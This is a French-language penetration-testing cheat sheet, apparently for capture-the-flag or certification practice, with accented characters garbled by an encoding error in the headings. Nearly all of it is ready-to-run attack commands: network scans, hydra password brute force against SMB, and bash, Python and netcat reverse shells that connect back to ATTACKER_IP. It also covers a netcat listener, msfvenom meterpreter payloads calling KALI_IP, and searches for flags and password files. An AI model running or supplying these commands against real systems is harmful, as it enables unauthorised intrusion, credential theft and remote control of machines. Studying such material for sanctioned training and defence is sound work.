# âš¡ Commandes Rapides

[â† Retour Ã  la table des matiÃ¨res](../README.md)

## ðŸ“‹ Table des MatiÃ¨res
- [Scan Initial](#scan-initial-rapide)
- [Ã‰numÃ©ration Express](#Ã©numÃ©ration-express-par-service)
- [Reverse Shells](#reverse-shells-rapides)
- [AmÃ©lioration du Shell](#amÃ©lioration-du-shell)
- [Commandes Windows](#commandes-windows-utiles)
- [Generation de Payloads](#generation-rapide-de-payloads)
- [Recherche d'Exploits](#recherche-dexploits)
- [Recherche de Fichiers](#recherche-de-fichiers)

## Scan initial rapide
```bash
# Host discovery
nmap -sn target.0/24

# Port scan rapide
nmap -F targetIP

# Scan complet
nmap -sC -sV -O targetIP
```

## Ã‰numÃ©ration express par service
```bash
# HTTP
gobuster dir -u http://targetIP -w /usr/share/wordlists/dirb/common.txt

# SMB - MÃ©thodologie complÃ¨te â†’ [ðŸ“– Guide Hydra](../06-tools/hydra.md) [ðŸ“– Guide CrackMapExec](../06-tools/crackmapexec.md) [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
crackmapexec smb targetIP -u username -p password --shares
smbclient //targetIP/C$ -U administrator

# SMB - Ã‰numÃ©ration basique â†’ [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
enum4linux -a targetIP
smbclient -L targetIP -N

# FTP
ftp targetIP  # anonymous:anonymous

# SSH
ssh targetIP  # Tester comptes par dÃ©faut
```

## Reverse shells rapides
```bash
# Bash
/bin/bash -c 'bash -i>&/dev/tcp/ATTACKER_IP/PORT 0>&1'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh ATTACKER_IP PORT
```

## Listener
```bash
nc -nvlp PORT
```

## AmÃ©lioration du shell

### CrÃ©er un shell interactif complet
```bash
# MÃ©thode 1 : avec script (recommandÃ©)
script /dev/null -c bash

# MÃ©thode 2 : avec Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# MÃ©thode 3 : avec script classique
script -qc /bin/bash /dev/null

# AmÃ©liorer ensuite avec :
Ctrl+Z                           # Mettre en background
stty raw -echo; fg               # Activer raw mode
export TERM=xterm                # Pour clear et autres commandes
```

**ðŸ’¡ Pourquoi utiliser `script /dev/null -c bash` ?**
- CrÃ©e un vrai TTY (terminal interactif)
- Permet d'utiliser `su`, `sudo`, les flÃ¨ches directionnelles
- Active l'autocomplÃ©tion avec Tab
- Meilleur pour la stabilitÃ© du shell

## Commandes Windows utiles

### Recherche de flags
```cmd
# Liste des rÃ©pertoires
dir C:\

# Lecture d'un fichier
type C:\path\to\flag.txt

# Recherche rÃ©cursive
dir C:\ /s /b | findstr flag
```

### Connexion RDP depuis Linux
```bash
xfreerdp /u:username /p:password /v:targetIP:targetPort
```

## Generation rapide de payloads

*â†’ [ðŸ“– Guide MSFVenom complet](../06-tools/msfvenom.md)*

```bash
# Meterpreter Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f exe > shell.exe

# ASP pour WebDAV
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=1234 -f asp > shell.asp
```

## Recherche d'exploits

*â†’ [ðŸ“– Guide Searchsploit complet](../06-tools/searchsploit.md)*

```bash
# Searchsploit pour trouver des exploits
searchsploit service_name
searchsploit hfs
searchsploit "rejetto"

# VÃ©rifier les versions aprÃ¨s Ã©numÃ©ration
searchsploit "apache 2.4.7"
```

## Recherche de fichiers
```bash
# Recherche de fichiers par nom (Linux)
find / -name "*flag*" 2>/dev/null
find / -name "*password*" 2>/dev/null

# Recherche de fichiers spÃ©cifiques
find / -name "*FlageSearch*" 2>/dev/null
```